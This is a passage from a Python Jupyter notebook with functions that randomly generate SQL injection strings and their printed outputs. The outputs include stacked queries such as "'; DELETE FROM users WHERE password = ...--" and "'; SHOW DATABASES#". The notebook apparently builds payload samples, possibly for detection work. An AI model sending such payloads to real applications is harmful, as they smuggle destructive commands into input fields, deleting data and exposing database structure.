    "        random_table_value=table_value[random_table][random.randint(0, len(table_value[random_table])-1)]\n",
    "        random_last=last[random.randint(0, len(last)-1)]\n",
    "        random_string=generate_random_string(random.randint(1, 15))\n",
    "        gen.append(\"'; \"+\"DELETE FROM \" + random_table + \" WHERE \" + random_table_value + \" = \" + random_string +random_last)\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'; DELETE FROM users WHERE password = QbUeiWISJb7Z-- \",\n",
       " \"'; DELETE FROM employee WHERE nickname = sXWIP# \",\n",
       " \"'; DELETE FROM customer WHERE fname = HR#\",\n",
       " \"'; DELETE FROM employee WHERE id_card = n3w9iLOttAbv# \",\n",
       " \"'; DELETE FROM customer WHERE lname = ovgwLtS7Y#\",\n",
       " \"'; DELETE FROM customer WHERE customer_id = BV0# \",\n",
       " \"'; DELETE FROM service WHERE name = 1# \",\n",
       " \"'; DELETE FROM customer WHERE fname = m2FLNPUpfvd0aIV#\",\n",
       " \"'; DELETE FROM service WHERE price = uTCZ21V-- \",\n",
       " \"'; DELETE FROM service WHERE price = tAqKvgFzB4# \"]"
      ]
     },
     "execution_count": 132,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomDelete(table, table_value, last)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomShow(showList, last):\n",
    "    gen=[]\n",
    "    for i in range(10) :\n",
    "        random_show=showList[random.randint(0, len(showList)-1)]\n",
    "        random_last=last[random.randint(0, len(last)-1)]\n",
    "        gen.append(\"'; \" + \"SHOW \" + random_show + random_last)\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['; SHOW TABLES# ',\n",
       " '; SHOW DATABASES# ',\n",
       " '; SHOW TABLES-- ',\n",
       " '; SHOW DATABASES#',\n",
       " '; SHOW COLUME-- ',\n",
       " '; SHOW DATABASES# ',\n",
       " '; SHOW TABLES# ',\n",
       " '; SHOW COLUME-- ',\n",
       " '; SHOW COLUME# ',\n",
       " '; SHOW TABLES-- ']"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomShow(showList, last)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.0"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "c261aea317cc0286b3b3261fbba9abdec21eaa57589985bb7a274bf54d6cc0a7"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
